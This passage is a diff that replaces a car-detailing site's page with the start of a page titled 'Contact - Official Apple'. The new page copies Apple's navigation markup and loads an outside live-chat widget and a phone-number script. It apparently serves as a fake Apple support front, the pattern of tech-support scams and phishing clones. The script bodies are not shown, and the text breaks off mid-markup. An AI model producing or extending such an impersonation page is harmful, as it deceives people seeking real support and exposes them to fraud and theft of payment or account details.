@@ -1,1407 +1,379 @@
-
-
-
-<!DOCTYPE html>
-<html>
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width" />
-    <title>ImpulseIconjos | Complete Care for Your Vehicle Inside and Out</title>
-    <meta property="og:title" content="ImpulseIconjos | Complete Care for Your Vehicle Inside and Out" />
-    <meta property="og:image" content="service-images/main-detailing-hero.webp" />
-    
-    <meta property="og:description" content="When a vehicle spends years navigating dusty highways, crowded parking lots, and unpredictable weather, the effects accumulate slowly on every surface. Dust." />
-    <meta name="description" content="When a vehicle spends years navigating dusty highways, crowded parking lots, and unpredictable weather, the effects accumulate slowly on every surface. Dust." />
-    <meta name="twitter:title" content="ImpulseIconjos | Complete Care for Your Vehicle Inside and Out">
-    <meta name="twitter:image:src" content="service-images/main-detailing-hero.webp"/>
-    <link rel="stylesheet" href="folder/style/bootstrap.css" /> 
-    <link rel="stylesheet" href="folder/style/bootstrap-icons.css" />
-    <link rel="stylesheet" href="folder/style/slick.css" />
-    <link rel="stylesheet" href="folder/style/slick-theme.css" />
-
-     
-    <link href="https://fonts.googleapis.com/css2?family=Inria+Sans:ital,wght@0,300;0,400;0,700;1,300;1,400;1,700&display=swap" rel="stylesheet" />
-    <link href="https://fonts.googleapis.com/css2?family=Calistoga&display=swap" rel="stylesheet" />
-    <link rel="shortcut icon" href="icon.png" type="image/x-icon" />
-    <script src="folder/script/jquery.min.js"></script>
-    <style>
-      a:hover{
-          color: inherit;
-      }
-      li{
-          list-style: none;
-      }
-      .pr-maim {
-        padding: 105px 0px;
-      }
-      body{
-          font-family: 'Inria Sans', sans-serif !important;
-          direction: ltr;
-          font-size: 1rem;
-          margin: 0;
-      }
-      .title-h{
-          font-size: 37px;
-          margin-bottom: 28px;
-          text-transform: uppercase;
-      }
-      html {
-          scroll-behavior: smooth;
-      }
-
-      .parallax-item {
-          display: flex;
-          flex-direction: column;
-          align-items: center;
-          justify-content: center;
-          width: 100%;
-          min-height: 100vh;
-      }
-
-      .parallax-item:first-child {
-          background: url(pics/workshop-background.webp);
-          background-size: cover;
-      }
-
-      .parallax-item:nth-child(2) {
-          background-image: linear-gradient(to top, #830910, #85031c, #850228, #840532, #810c3c);
-          color: #ffffff;
-      }
-
-      .parallax-item:nth-child(3) {
-          background: url(pics/detailing-tools-bg.webp);
-          background-size: cover;
-          background-position: center;
-          background-attachment: fixed;
-          min-height: 600px;
-      }
-
-      .parallax-item:nth-child(4) {
-          background: #830910;
-          color: #ffffff;
-      }
-
-      .parallax-item:nth-child(5) {
-          background: url(pics/bg.jpg);
-          background-size: cover;
-          background-position: center;
-          background-attachment: fixed;
-          min-height: 600px;
-      }
-
-      .parallax-item:nth-child(6) {
-          background-image: linear-gradient(to bottom, #6b285b, #642d60, #5c3264, #543667, #4c3a69);
-          color: #ffffff;
-      }
-
-      @media screen and (max-width: 768px) {
-          .parallax-item h2 {
-              font-size: 1.5rem;
-          }
-      }
-
-      .header__blocker{
-          padding: 105px;
-          border-radius: 0px;
-          max-width: 713px;
-          margin: 28px;
-      }
-      .header__blocker--logo{
-          display: flex;
-          gap: 11px;
-          align-items: center;
-          border-bottom: 3px solid;
-          padding-bottom: 11px;
-          border-color: #830910;
-      }
-      .header__blocker--logo img{
-          width: 45px;
-      }
-      .header__blocker--logo a{
-        color: #fff;
-          text-decoration: none;
-          font-size: 30px;
-          font-family: 'Calistoga', sans-serif;
-          margin: 0;
-      }
-      .header__blocker--content{
-          padding-top: 28px;
-          text-align: center;
-          display: flex;
-          flex-direction: column;
-          gap: 21px;
-      }
-      .header__blocker--content h5{
-          font-size: 20px;
-      }
-      .header__blocker--content a{
-          text-decoration: none;
-          text-align: center;
-      }
-      .header__blocker--content form button{
-          margin: 0;
-          width: 100%;
-          justify-content: center;
-      }
-      .form-check{
-          margin-top: 11px;
-          font-size: 13px;
-          display: flex;
-          justify-content: center;
-          gap: 9px;
-      }
-      .bigPadd{
-          padding-top: 105px;
-          padding-bottom: 105px;
-      }
-      .picshape{
-          max-width: 525px;
-          clip-path: circle();
-          shape-outside: circle(50%);
-      }
-      .price-art{
-          font-size: 30px;
-
-      }
-      .team-box{
-          display: flex;
-          flex-wrap: wrap;
-          gap: 21px;
-          flex-direction: column;
-      }
-      .team-box__item{
-          width: 47%;
-          padding: 21px;
-          border-radius: 0px;
-          display: flex;
-          flex-direction: column;
-          gap: 11px;
-          justify-content: center;
-          align-items: center;
-          border-right: 1px solid #830910;
-          border-left: 1px solid #830910;
-      }
-      .team-box__item img{
-          max-width: 90px;
-          border-radius: 0%;
-          border: 0px solid;
-      }
-      .team-box__item p{
-          margin-bottom: 3px;
-          font-weight: 500;
-      }
-      .team-box__item span{
-          font-size: 15px
-          opacity: 0.9;
-      }
-      .latest--news{
-          padding: 28px;
-          display: flex;
-          gap: 28px;
-          border-radius: 0px;
-          border-right: 1px solid #830910;
-          border-left: 1px solid #830910;
-          flex-wrap: wrap;
-          justify-content: center;
-      }
-      .latest--news__item{
-          display: flex;
-          flex-direction: column;
-          gap: 9px;
-          width: 46%;
-      }
-      .latest--news__item img{
-          max-width: 100%;
-          width: 100%;
-          height: 221px;
-          object-fit: cover;
-          border-radius: 0px;
-      }
-      .latest--news__item:nth-child(3){
-          display: none;
-      }
-      .latest--news__item:nth-child(4){
-          display: none;
-      }
-      .latest--news__item a{
-          color: inherit;
-          font-weight: bold;
-          text-decoration: none;
-      }
-      .latest--news__item a:hover{
-          opacity: 0.8;
-      }
-      .stats--wrapper__item{
-      margin: 21px 0px;
-      display: flex;
-      gap: 9px;
-      flex-direction: column;
-  }
-  .stats--wrapper__item > div:first-child{
-      font-weight: 500;
-      font-size: 16px;
-  }
-  .progress{
-      height: 21px;
-  }
-  .progress-inform{
-      display: flex;
-      gap: 21px;
-      justify-content: space-between;
-      align-items: center;
-  }
-  .progress-inform > div:last-child{
-      font-size: 30px;
-      font-weight: 500;
-  }
-
-      .bgImg img{
-          max-width: 100%;
-          width: 100%;
-          height: 221px;
-          object-fit: cover;
-      }
-      .opH{
-          display: flex;
-          flex-direction: column;
-          gap: 21px;
-      }
-      .opH--item{
-          font-size: 21px;
-          text-transform: uppercase;
-      }
-      .testom-bloсk--item{
-          padding: 28px;
-          display: flex;
-          align-items: flex-start;
-          gap: 20px;
-          border-top: 1px solid #3F070A;
-          border-bottom: 1px solid #3F070A;
-          color: #ffffff;
-          flex-direction: column-reverse;
-      }
-      .testom-bloсk--item img{
-          width: 90px;
-          border-radius: 0%;
-          border: 0px solid;
-      }
-      .testom-bloсk--item p{
-          font-size: 21px;
-          font-weight: 500;
-          margin-bottom: 0px;
-      }
-      .testom-bloсk--item span{
-          opacity: 0.7;
-          font-size: 15px
-      }
-      .testom-bloсk--item__txt{
-          display: flex;
-          flex-direction: column;
-          gap: 9px;
-      }
-      .commgfd{
-          font-size: 16px;
-      }
-      .slick-dots li.slick-active button:before{
-          color: #830910;
-          font-size: 21px;
-      }
-      .slick-dots li button:before{
-          color: #830910;
-          font-size: 21px;
-      }
-      .myflex{
-          flex-direction: row-reverse;
-      }
-      .mychekform .form-check{
-          justify-content: start;
-      }
-      .mychekform .form-check input{
-          border-left: 1px solid rgba(0,0,0,.25);
-          padding:7px;
-      }
-      .mychekform button{
-          width: 100%;
-          text-align: center;
-          display: flex;
-          align-items: center;
-          justify-content: center;
-      }
-      .mychekform input{
-          border-left: 4px solid #009500;
-          padding: 11px;
-      }
-      .mychekform textarea{
-          border-left: 4px solid #009500;
-      }
-      .splitdiv{
-          display: flex;
-          gap: 10px;
-      }
-      .map--block{
-          border: 4px solid #009500;
-          border-radius: 0px;
-          box-shadow: 0px 0px 0px #009500;
-      }
-      .map--block iframe{
-          border-radius: 0px;
-      }
-      .contact__wrapper{
-          display: flex;
-          flex-direction: column;
-          gap: 30px;
-      }
-      .contact__wrapper--item{
-          display: flex;
-          align-items: center;
-          gap: 11px;
-      }
-      .contact__wrapper--icon{
-          background: #009500;
-          padding: 11px;
-          border-radius: 0px;
-      }
-      .contact__wrapper--icon i{
-          font-size: 30px;
-      }
-      .contact__wrapper--text{
-          display: flex;
-          flex-direction: column;
-          gap: 9px;
-      }
-      .contact__wrapper--text h5{
-          margin: 0;
-          font-size: 23px;
-      }
-      .contact__wrapper--text > div{
-          font-size: 16px
-      }
-
-      .contact__wrapper--text a{
-        text-decoration: none;
-        color: inherit;
-      }
-
-      .flexfse{
-          display: flex;
-          flex-direction: column;
-          gap: 105px;
-      }
-      .prtva{
-          display: flex;
-          flex-direction: column;
-          align-items: center;
-      }
-      .prtva a{
-          text-decoration: none;
-          color: inherit;
-      }
-      .prtva a:hover{
-          opacity: 0.7;
-      }
-
-      .form-field {
-          display: flex;
-          flex-direction: column;
-          gap: 11px;
-      }
-      .input-user-block__input{
-          border-left: 2px solid #009A44;
-          display: block;
-          width: 100%;
-          padding:  11px;
-          font-size: 1rem;
-          font-weight: 400;
-          line-height: 1.5;
-          color: #212529;
-          background-color: #fff;
-          background-clip: padding-box;
-          border: 1px solid #ced4da;
-          -webkit-appearance: none;
-          -moz-appearance: none;
-          appearance: none;
-          border-radius: 0.25rem;
-          transition: border-color .15s ease-in-out,box-shadow .15s ease-in-out;
-      }
-      .textarea-user-block__input{
-          border-left: 2px solid #009A44;
-          padding: 10px;
-          width: 100%;
-          border: 1px solid #ced4da;
-          border-radius: 0.25rem;
-          padding:  11px;
-      }
-      .padfs-1 {
-          flex: 1;
-      }
-      .header__blocker a {
-        text-decoration: none;
-        color: #fff;
-      }
-      .testom-bloсk--item {
-          background-color: #830910cc;
-      }
-      footer {
-        padding-bottom: 58px;
-      }
-
-    .content-block a {
-      word-wrap: break-word;
-    }
-     .titlOn {
-      margin-bottom: 21px;
-     }
-
-  @media (max-width: 992px){
-    .picshape{
-        float: none !important;
-        max-width: 100%;
-        margin-bottom: 40px;
-    }
-    .contentpar{
-        text-align: center;
-    }
-    .pad2 .row{
-        flex-direction: column !important;
-        gap: 40px;
-    }
-    .myflex{
-        flex-direction: column !important;
-        gap: 40px;
-    }
-    .testom-bloсk--item{
-        flex-direction: column !important;
-        justify-content: center;
-        align-items: center;
-        text-align: center;
-    }
-    .padfs{
-        flex-direction: column !important;
-        gap: 40px;
-    }
-    .team-box{
-        flex-direction: column;
-    }
-    .team-box__item{
-        width: 100%;
-    }
-}
-@media(max-width: 760px){
-    .header__blocker--logo h1{
-        font-size: 22px;
-    }
-    .title-h{
-        font-size: 22px;
-        text-align: center;
-    }
-    .opH{
-        align-items: center;
-        text-align: center;
-    }
-    .header__blocker{
-        padding: 40px;
-    }
-    .latest--news{
-        flex-direction: column !important;
-    }
-    .latest--news__item{
-        width: 100%;
-    }
-    .contact__wrapper--item{
-        flex-direction: column !important;
-        text-align: center;
-    }
-
-}
-.imgMain {
-  display: flex;
-  flex-direction: column;
-  justify-content: center;
-  align-items: center;
-}
-.osnovaImgMain {
-  height: 304px;
-  width: 100%;
-  object-fit: contain;
-}
-@media (max-width: 575px){
-  .osnovaImgMain {
-    height: auto;
-  }
-          button{
-              width: 100%;
-          }
-      }
-
-@media(max-width: 480px){
-    .header__blocker{
-        padding: 20px;
-    }
-    .header__blocker--content h5{
-        font-size: 20px;
-    }
-    .header__blocker--logo{
-        justify-content: center;
-        flex-direction: column !important;
-    }
-    .header__blocker--content{
-        justify-content: center;
-        text-align: center;
-    }
-}
-      .btn-style-1 {
-        align-items: center;
-        appearance: none;
-        background-clip: padding-box;
-        background-color: initial;
-        background-image: none;
-        border-style: none;
-        box-sizing: border-box;
-        color: #fff;
-        cursor: pointer;
-        display: inline-block;
-        flex-direction: row;
-        flex-shrink: 0;
-        font-size: 16px;
-        font-weight: 800;
-        justify-content: center;
-        line-height: 24px;
-        margin: 0;
-        min-height: 64px;
-        outline: none;
-        overflow: visible;
-        padding: 19px 26px;
-        pointer-events: auto;
-        position: relative;
-        text-align: center;
-        text-decoration: none;
-        text-transform: none;
-        user-select: none;
-        -webkit-user-select: none;
-        touch-action: manipulation;
-        vertical-align: middle;
-        width: auto;
-        word-break: keep-all;
-        z-index: 0;
-      }
-
-      @media (min-width: 768px) {
-        .btn-style-1 {
-          padding: 19px 32px;
-        }
-      }
-
-      .btn-style-1:before,
-      .btn-style-1:after {
-        border-radius: 80px;
-      }
-
-      .btn-style-1:before {
-        background-color: rgba(249, 58, 19, .32);
-        content: "";
-        display: block;
-        height: 100%;
-        left: 0;
-        overflow: hidden;
-        position: absolute;
-        top: 0;
-        width: 100%;
-        z-index: -2;
-      }
-
-      .btn-style-1:after {
-        background-color: initial;
-        background-image: linear-gradient(92.83deg, #ff7426 0, #f93a13 100%);
-        bottom: 4px;
-        content: "";
-        display: block;
-        left: 4px;
-        overflow: hidden;
-        position: absolute;
-        right: 4px;
-        top: 4px;
-        transition: all 100ms ease-out;
-        z-index: -1;
-      }
-
-      .btn-style-1:hover:not(:disabled):after {
-        bottom: 0;
-        left: 0;
-        right: 0;
-        top: 0;
-        transition-timing-function: ease-in;
-      }
-
-      .btn-style-1:active:not(:disabled) {
-        color: #ccc;
-      }
-
-      .btn-style-1:active:not(:disabled):after {
-        background-image: linear-gradient(0deg, rgba(0, 0, 0, .2), rgba(0, 0, 0, .2)), linear-gradient(92.83deg, #ff7426 0, #f93a13 100%);
-        bottom: 4px;
-        left: 4px;
-        right: 4px;
-        top: 4px;
-      }
-
-      .btn-style-1:disabled {
-        cursor: default;
-        opacity: .24;
-      }
-
-      .btn-style-2 {
-        backface-visibility: hidden;
-        background: #332cf2;
-        border: 0;
-        border-radius: .375rem;
-        box-sizing: border-box;
-        color: #fff;
-        cursor: pointer;
-        display: inline-block;
-        font-size: 1.125rem;
-        font-weight: 700;
-        letter-spacing: -.01em;
-        line-height: 1.3;
-        padding: 1rem 1.25rem;
-        position: relative;
-        text-align: left;
-        text-decoration: none;
-        transform: translateZ(0) scale(1);
-        transition: transform .2s;
-        user-select: none;
-        -webkit-user-select: none;
-        touch-action: manipulation;
-      }
-
-      .btn-style-2:disabled {
-        color: #787878;
-        cursor: auto;
-      }
-
-      .btn-style-2:not(:disabled):hover {
-        transform: scale(1.05);
-      }
-
-      .btn-style-2:not(:disabled):hover:active {
-        transform: scale(1.05) translateY(.125rem);
-      }
-
-      .btn-style-2:focus {
-        outline: 0 solid transparent;
-      }
-
-      .btn-style-2:focus:before {
-        border-width: .125rem;
-        content: "";
-        left: calc(-1*.375rem);
-        pointer-events: none;
-        position: absolute;
-        top: calc(-1*.375rem);
-        transition: border-radius;
-        user-select: none;
-      }
-
-      .btn-style-2:focus:not(:focus-visible) {
-        outline: 0 solid transparent;
-      }
-
-      .btn-style-2:not(:disabled):active {
-        transform: translateY(.125rem);
-      }
-
-      .btn-style-3 {
-        background: #fff;
-        backface-visibility: hidden;
-        border-radius: .375rem;
-        border-style: solid;
-        border-width: .125rem;
-        box-sizing: border-box;
-        color: #212121;
-        cursor: pointer;
-        display: inline-block;
-        font-size: 1.125rem;
-        font-weight: 700;
-        letter-spacing: -.01em;
-        line-height: 1.3;
-        padding: .875rem 1.125rem;
-        position: relative;
-        text-align: left;
-        text-decoration: none;
-        transform: translateZ(0) scale(1);
-        transition: transform .2s;
-        user-select: none;
-        -webkit-user-select: none;
-        touch-action: manipulation;
-      }
-
-      .btn-style-3:not(:disabled):hover {
-        transform: scale(1.05);
-      }
-
-      .btn-style-3:not(:disabled):hover:active {
-        transform: scale(1.05) translateY(.125rem);
-      }
-
-      .btn-style-3:focus {
-        outline: 0 solid transparent;
-      }
-
-      .btn-style-3:focus:before {
-        content: "";
-        left: calc(-1*.375rem);
-        pointer-events: none;
-        position: absolute;
-        top: calc(-1*.375rem);
-        transition: border-radius;
-        user-select: none;
-      }
-
-      .btn-style-3:focus:not(:focus-visible) {
-        outline: 0 solid transparent;
-      }
-
-      .btn-style-3:focus:not(:focus-visible):before {
-        border-width: 0;
-      }
-
-      .btn-style-3:not(:disabled):active {
-        transform: translateY(.125rem);
-      }
-
-      .btn-style-4 {
-        appearance: button;
-        background-color: transparent;
-        background-image: linear-gradient(to bottom, #fff, #f8eedb);
-        border: 0 solid #e5e7eb;
-        border-radius: .5rem;
-        box-sizing: border-box;
-        color: #482307;
-        column-gap: 1rem;
-        cursor: pointer;
-        display: flex;
-        font-size: 100%;
-        font-weight: 700;
-        line-height: 24px;
-        margin: 0;
-        outline: 2px solid transparent;
-        padding: 1rem 1.5rem;
-        text-align: center;
-        text-transform: none;
-        transition: all .1s cubic-bezier(.4, 0, .2, 1);
-        user-select: none;
-        -webkit-user-select: none;
-        touch-action: manipulation;
-        box-shadow: -6px 8px 10px rgba(81,41,10,0.1),0px 2px 2px rgba(81,41,10,0.2);
-      }
-
-      .btn-style-4:active {
-        background-color: #f3f4f6;
-        box-shadow: -1px 2px 5px rgba(81,41,10,0.15),0px 1px 1px rgba(81,41,10,0.15);
-        transform: translateY(0.125rem);
-      }
-
-      .btn-style-4:focus {
-        box-shadow: rgba(72, 35, 7, .46) 0 0 0 4px, -6px 8px 10px rgba(81,41,10,0.1), 0px 2px 2px rgba(81,41,10,0.2);
-      }
-
-      .btn-style-5 {
-        padding: 0.6em 2em;
-        border: none;
-        outline: none;
-        color: rgb(255, 255, 255);
-        background: #111;
-        cursor: pointer;
-        position: relative;
-        z-index: 0;
-        border-radius: 10px;
-        user-select: none;
-        -webkit-user-select: none;
-        touch-action: manipulation;
-      }
-
-      .btn-style-5:before {
-        content: "";
-        background: linear-gradient(
-          45deg,
-          #ff0000,
-          #ff7300,
-          #fffb00,
-          #48ff00,
-          #00ffd5,
-          #002bff,
-          #7a00ff,
-          #ff00c8,
-          #ff0000
-        );
-        position: absolute;
-        top: -2px;
-        left: -2px;
-        background-size: 400%;
-        z-index: -1;
-        filter: blur(5px);
-        -webkit-filter: blur(5px);
-        width: calc(100% + 4px);
-        height: calc(100% + 4px);
-        animation: glowing-btn-style-5 20s linear infinite;
-        transition: opacity 0.3s ease-in-out;
-        border-radius: 10px;
-      }
-
-      @keyframes glowing-btn-style-5 {
-        0% {
-          background-position: 0 0;
-        }
-        50% {
-          background-position: 400% 0;
-        }
-        100% {
-          background-position: 0 0;
-        }
-      }
-
-      .btn-style-5:after {
-        z-index: -1;
-        content: "";
-        position: absolute;
-        width: 100%;
-        height: 100%;
-        background: #222;
-        left: 0;
-        top: 0;
-        border-radius: 10px;
-      }
-
-      .btn-style-6 {
-        align-items: center;
-        background-clip: padding-box;
-        background-color: #fa6400;
-        border: 1px solid transparent;
-        border-radius: .25rem;
-        box-shadow: rgba(0, 0, 0, 0.02) 0 1px 3px 0;
-        box-sizing: border-box;
-        color: #fff;
-        cursor: pointer;
-        display: inline-flex;
-        font-family: system-ui,-apple-system,system-ui,"Helvetica Neue",Helvetica,Arial,sans-serif;
-        font-size: 16px;
-        font-weight: 600;
-        justify-content: center;
-        line-height: 1.25;
-        margin: 0;
-        min-height: 3rem;
-        padding: calc(.875rem - 1px) calc(1.5rem - 1px);
-        position: relative;
-        text-decoration: none;
-        transition: all 250ms;
-        user-select: none;
-        -webkit-user-select: none;
-        touch-action: manipulation;
-        vertical-align: baseline;
-        width: auto;
-      }
-
-      .btn-style-6:hover,
-      .btn-style-6:focus {
-        background-color: #fb8332;
-        box-shadow: rgba(0, 0, 0, 0.1) 0 4px 12px;
-      }
-
-      .btn-style-6:hover {
-        transform: translateY(-1px);
-      }
-
-      .btn-style-6:active {
-        background-color: #c85000;
-        box-shadow: rgba(0, 0, 0, .06) 0 2px 4px;
-        transform: translateY(0);
-      }
-      .btn-style-7 {
-        margin: 10px;
-        padding: 15px 30px;
-        text-align: center;
-        text-transform: uppercase;
-        transition: 0.5s;
-        background-size: 200% auto;
-        color: white;
-        border-radius: 10px;
-        display: block;
-        border: 0px;
-        font-weight: 700;
-        box-shadow: 0px 0px 14px -7px #f09819;
-        background-image: linear-gradient(45deg, #FF512F 0%, #F09819  51%, #FF512F  100%);
-        cursor: pointer;
-        user-select: none;
-        -webkit-user-select: none;
-        touch-action: manipulation;
-      }
-
-      .btn-style-7:hover {
-        background-position: right center; 
-        color: #fff;
-        text-decoration: none;
-      }
-
-      .btn-style-7:active {
-        transform: scale(0.95);
-      }
-
-      .btn-style-8 {
-        display: flex;
-        align-items: center;
-        font-weight: 500;
-        font-size: 16px;
-        padding: 0.7em 1.4em 0.7em 1.1em;
-        color: white;
-        background: #ad5389;
-        background: linear-gradient(0deg, rgba(20,167,62,1) 0%, rgba(102,247,113,1) 100%);
-        border: none;
-        box-shadow: 0 0.7em 1.5em -0.5em #14a73e98;
-        letter-spacing: 0.05em;
-        border-radius: 20em;
-        cursor: pointer;
-        user-select: none;
-        -webkit-user-select: none;
-        touch-action: manipulation;
-      }
-
-      .btn-style-8:hover {
-        box-shadow: 0 0.5em 1.5em -0.5em #14a73e98;
-      }
-
-      .btn-style-8:active {
-        box-shadow: 0 0.3em 1em -0.5em #14a73e98;
-      }
-
-      .btn-style-9 {
-        background-color: #fff;
-        border: 0 solid #e2e8f0;
-        border-radius: 1.5rem;
-        box-sizing: border-box;
-        color: #0d172a;
-        cursor: pointer;
-        display: inline-block;
-        font-size: 1.1rem;
-        font-weight: 600;
-        line-height: 1;
-        padding: 1rem 1.6rem;
-        text-align: center;
-        text-decoration: none #0d172a solid;
-        text-decoration-thickness: auto;
-        transition: all .1s cubic-bezier(.4, 0, .2, 1);
-        box-shadow: 0px 1px 2px rgba(166, 175, 195, 0.25);
-        user-select: none;
-        -webkit-user-select: none;
-        touch-action: manipulation;
-      }
-
-      .btn-style-9:hover {
-        background-color: #1e293b;
-        color: #fff;
-      }
-
-      @media (min-width: 768px) {
-        .btn-style-9 {
-          font-size: 1.125rem;
-          padding: 1rem 2rem;
-        }
-      }
-
-      .btn-style-10 {
-        align-self: center;
-        background-color: #fff;
-        background-image: none;
-        background-position: 0 90%;
-        background-repeat: repeat no-repeat;
-        background-size: 4px 3px;
-        border-radius: 15px 225px 255px 15px 15px 255px 225px 15px;
-        border-style: solid;
-        border-width: 2px;
-        box-shadow: rgba(0, 0, 0, .2) 15px 28px 25px -18px;
-        box-sizing: border-box;
-        color: #41403e;
-        cursor: pointer;
-        display: inline-block;
-        font-size: 1rem;
-        line-height: 23px;
-        outline: none;
-        padding: .75rem;
-        text-decoration: none;
-        transition: all 235ms ease-in-out;
-        border-bottom-left-radius: 15px 255px;
-        border-bottom-right-radius: 225px 15px;
-        border-top-left-radius: 255px 15px;
-        border-top-right-radius: 15px 225px;
-        user-select: none;
-        -webkit-user-select: none;
-        touch-action: manipulation;
-      }
-
-      .btn-style-10:hover {
-        box-shadow: rgba(0, 0, 0, .3) 2px 8px 8px -5px;
-        transform: translate3d(0, 2px, 0);
-        color: #333 !important;
-      }
-
-      .btn-style-10:focus {
-        box-shadow: rgba(0, 0, 0, .3) 2px 8px 4px -6px;
-      }
-      .content-block {
-        word-break: break-all;
-        padding: 105px 0;
-
-    }
-
-    .content-block li {
-      list-style: disc;
-      margin: 0 20px;
-      padding:  9px 0;
-    }
-    .content-block p {
-      padding:  9px 0;
-    }
-    
-.company-id{display:inline-block;margin-top:.7em;font-size:.82em;opacity:.72;letter-spacing:.04em;line-height:1.5;text-decoration:none;cursor:default;pointer-events:none;flex-shrink:0;max-width:100%;}.company-id-wrap{flex-shrink:0;max-width:100%;}
-</style>
-    
-    
-    
-  </head>
-  <body>
-
-    
-    <section>
-      <header id="parallax" class="parallax-item footeryz-box">
-        <div class="header__blocker">
-          <a href="./">
-            <div class="header__blocker--logo">
-              <img src="icon.png" alt="" />
-              <a href="./">ImpulseIconjos</a>
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js"><head>
+
+<!-- Privacy-friendly analytics by Plausible -->
+<script async src="https://plausible.io/js/pa-4vWoWKoAAC8kAVwpL5puO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
+
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script async="" src="https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t" charset="UTF-8" crossorigin="*"></script><script src="js/text_tel.js"></script>
+
+</head>
+
+<body>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
